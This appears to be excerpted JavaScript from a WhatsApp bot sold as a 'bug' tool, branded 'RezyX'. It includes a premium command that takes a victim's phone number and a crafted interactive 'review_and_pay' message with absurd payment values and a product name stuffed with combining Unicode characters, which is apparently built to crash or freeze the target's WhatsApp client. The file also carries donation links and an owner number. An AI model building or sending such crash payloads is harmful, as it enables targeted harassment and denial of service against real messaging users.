...
const totalFitur = () =>{
            var mytext = fs.readFileSync("./RelltTzy.js").toString()
...
const bugres = '𝐃𝐎𝐍𝐄 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆 𝐁𝐘 𝐑𝐄𝐘𝐙𝐗𝐂𝐔𝐊𝐈 ☯︎'
...
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ 𝐑𝐄𝐘𝐙𝐗 𝐃𝐄𝐕 </> ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}
			...
			'message': {
				"interactiveMessage": {
					...
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍︎🩸⃟༑⌁⃰𝐑𝐞𝐲𝐳𝐗 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
...
const menu = `╭──(         𝐑𝐄𝐘𝐙𝐗 ☇ 𝐙𝐀𝚸         )
║ᨒ 𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢\`\〽️
│🎭 𝐍𝐚𝐦𝐞 : ${m.pushName}
║▬▭▬▭▬▭▬▭▬▭
│🎭 𝐎𝐰𝐧𝐞𝐫 : ${author}
║🎭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐑𝐞𝐲𝐳𝐗𝐩𝐥𝐨𝐢𝐭\`\〽️
│🎭 𝐎𝐰𝐧 𝐍𝐨 : 12543670150
║🎭 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
│▬▭「 𝐑𝐞𝐲𝐳𝐗𝐩𝐥𝐨𝐢𝐭🐉 」▭▬
║› 𝐑𝐞𝐲𝐳𝐗𝐩𝐥𝐨𝐢𝐭 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣`
let sections = [{
title: '𝐑𝐄𝐘𝐙𝐗 ☇ 𝐙𝐀𝚸',
...
"buttonParamsJson": JSON.stringify(listMessage) 
 ...
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐑𝐞𝐲𝐳𝐗𝐩𝐥𝐨𝐢𝐭🐉\",\"url\":\"https://youtube.com/@rzxyydev\",\"merchant_url\":\"https://youtube.com/@rzxyydev\"}"
}]
}) 
})} 
...
"buttonParamsJson": JSON.stringify(listMessage) 
 ...
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"𝐓𝐡𝐞 𝐑𝐞𝐲𝐳𝐗𝐩𝐥𝐨𝐢𝐭🐉\",\"url\":\"https://youtube.com/@rzxyydev\",\"merchant_url\":\"https://youtube.com/@zynxzoo\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
...
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/12543670150\",\"merchant_url\":\"https://whatsapp.com/channel/0029ValbDPt6WaKwXIRaHM0P"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://youtube.com/@rzxyydev\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"JOIN LAH DERR\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029ValbDPt6WaKwXIRaHM0P\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://deposit.pictures/p/8f3f4ab89de24d3faef51146d7439b3a\",\"merchant_url\":\"https://deposit.pictures/p/8f3f4ab89de24d3faef51146d7439b3a\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
...
zyn.sendMessage("12543670150@s.whatsapp.net", { text: "BANG RELLY ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break
...
case 'rzxyfuck': case 'rzxyxsentry': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
...
let msg = generateWAMessageFromContent(m.chat, {
 ...
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By rzxyydev', 
 serverMessageId: -1
},
...
case 'totalfitur': {
ngaceng = fs.readFileSync("./RellyTzy.js").toString(),
